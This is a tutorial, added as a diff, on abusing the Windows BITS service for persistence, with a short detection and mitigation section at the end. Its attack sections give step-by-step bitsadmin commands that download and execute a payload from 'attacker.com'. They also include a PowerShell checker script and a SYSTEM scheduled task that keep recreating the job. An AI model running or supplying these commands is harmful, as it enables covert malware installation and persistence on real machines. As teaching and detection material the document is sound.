@@ -1,0 +1,158 @@
+## **1. Introduction**
+
+### **What is BITS?**
+
+Background Intelligent Transfer Service (BITS) is a Windows component that transfers files in the background using idle network bandwidth. It's often used for Windows Update, Microsoft Defender, and other services.
+
+### **Abuse for Persistence**
+
+Attackers abuse BITS to download and execute payloads stealthily. Since BITS can:
+
+* Operate under system services,
+* Run in the background,
+* Persist across reboots,
+  it's an ideal choice for stealthy, long-term persistence.
+
+---
+
+## **2. Understanding BITS and Its Capabilities**
+
+* **BITS Jobs:** Asynchronous file transfer jobs (downloads/uploads).
+* **Execution Trigger:** BITS can invoke a program upon job completion (`/SetNotifyCmdLine`).
+* **Persistence:** Jobs can survive reboots and resume on reconnection.
+
+### **Why Attackers Use It**
+
+* Operates under legitimate Windows services.
+* Harder to detect in comparison to scheduled tasks or registry persistence.
+* Can retry on failure, useful for unreliable connections or intermittent access.
+
+---
+
+## **3. Creating a Malicious BITS Job**
+
+### **Preparation**
+
+Ensure you’re running PowerShell/CMD as Administrator.
+
+### **Steps**
+
+```cmd
+bitsadmin /create malwareJob
+```
+
+```cmd
+bitsadmin /addfile malwareJob http://attacker.com/payload.exe C:\Users\Public\payload.exe
+```
+
+```cmd
+bitsadmin /SetNotifyCmdLine malwareJob "C:\Users\Public\payload.exe" ""
+```
+
+```cmd
+bitsadmin /SetMinRetryDelay malwareJob 60
+```
+
+```cmd
+bitsadmin /SetNoProgressTimeout malwareJob 3600
+```
+
+```cmd
+bitsadmin /resume malwareJob
+```
+
+💡 This creates a job that:
+
+* Downloads the malicious payload,
+* Executes it on job completion,
+* Retries on failure every 60 seconds.
+
+---
+
+## **4. Implementing a Persistence Mechanism**
+
+### **Checker Script (PowerShell)**
+
+```powershell
+# checker.ps1
+$jobName = "malwareJob"
+$downloadUrl = "http://attacker.com/payload.exe"
+$localPath = "C:\Users\Public\payload.exe"
+
+function CreateBITSJob {
+    bitsadmin /create $jobName
+    bitsadmin /addfile $jobName $downloadUrl $localPath
+    bitsadmin /SetNotifyCmdLine $jobName $localPath ""
+    bitsadmin /resume $jobName
+}
+
+# Check if job exists
+$exists = bitsadmin /list | Select-String $jobName
+if (-not $exists) {
+    Write-Output "BITS job not found. Recreating..."
+    CreateBITSJob
+} else {
+    Write-Output "BITS job still exists."
+}
+```
+
+### **Automate with Scheduled Task**
+
+```powershell
+$task = @"
+schtasks /create /tn "BITSChecker" /tr "powershell.exe -File C:\Users\Public\checker.ps1" /sc minute /mo 5 /ru SYSTEM
+"@
+Invoke-Expression $task
+```
+
+---
+
+## **5. Detecting and Preventing Malicious BITS Jobs**
+
+### **Detection**
+
+* **Event Logs**: Look for BITS logs in Event Viewer under:
+
+  ```
+  Applications and Services Logs > Microsoft > Windows > BITS-Client > Operational
+  ```
+
+* **Check for unusual jobs**:
+
+  ```cmd
+  bitsadmin /list /allusers
+  ```
+
+* **Inspect jobs**:
+
+  ```cmd
+  bitsadmin /info malwareJob /verbose
+  ```
+
+### **Prevention**
+
+* Disable BITS if not needed.
+* Restrict who can use `bitsadmin`.
+* Monitor file downloads from suspicious URLs.
+* Use endpoint monitoring tools (e.g., Sysmon) to detect downloads + execution.
+
+---
+
+## **6. Conclusion**
+
+### **Summary**
+
+BITS is a powerful service in Windows abused by attackers for persistence:
+
+* Jobs are stealthy,
+* Persist across reboots,
+* Retry on failure,
+* Can execute payloads silently.
+
+### **Mitigation Tips**
+
+* Monitor for new BITS jobs,
+* Audit Event Logs regularly,
+* Alert on `bitsadmin` usage,
+* Combine with application whitelisting and EDR tools.
+
